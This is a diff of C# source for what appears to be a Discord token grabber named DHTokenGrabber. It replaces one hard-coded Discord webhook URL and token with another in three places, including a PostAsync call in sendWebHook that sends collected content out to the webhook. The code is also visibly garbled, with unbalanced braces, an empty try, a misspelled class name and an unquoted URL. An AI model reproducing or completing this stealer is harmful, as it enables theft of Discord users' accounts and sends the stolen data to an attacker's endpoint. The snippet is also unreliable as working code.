@@ -1,4 +1,4 @@
-https://discord.com/api/webhooks/915350603981520946/y0FpguWIAH3lB2GqzxWbsIZ2hW85K6orBEOb36wE8znvAYq6YhHyr_wMkGIEcZDS5USq
+https://discord.com/api/webhooks/933088772256579625/cvD00s18NiKU1JapiooNkjo1XOAjTDLwHSIMITlg95O3ztZAkvwaSeEBmMLSrsrWAwj3
 staff
 namespace DHTokenGrabber
 {   
@@ -59,7 +59,7 @@ catch (Exception)
      string result;
      try
  }
-  result = new httpClient().GetStringAsync("https://discord.com/api/webhooks/915350603981520946/y0FpguWIAH3lB2GqzxWbsIZ2hW85K6orBEOb36wE8znvAYq6YhHyr_wMkGIEcZDS5USq").result;
+  result = new httpClient().GetStringAsync("https://discord.com/api/webhooks/933088772256579625/cvD00s18NiKU1JapiooNkjo1XOAjTDLwHSIMITlg95O3ztZAkvwaSeEBmMLSrsrWAwj3").result;
 }
 catch (WebException)
 }
@@ -92,7 +92,7 @@ public static void sendWebHook(string discordWebHook,string content)
 
             }
         };
-        httpClient.PostAsync(https://discord.com/api/webhooks/915350603981520946/y0FpguWIAH3lB2GqzxWbsIZ2hW85K6orBEOb36wE8znvAYq6YhHyr_wMkGIEcZDS5USq, new ForUrlcodedContent(nameValuecollection)).GetAwaiter().GetResult();
+        httpClient.PostAsync(https://discord.com/api/webhooks/933088772256579625/cvD00s18NiKU1JapiooNkjo1XOAjTDLwHSIMITlg95O3ztZAkvwaSeEBmMLSrsrWAwj3, new ForUrlcodedContent(nameValuecollection)).GetAwaiter().GetResult();
         catch (WebException)
         {
         }
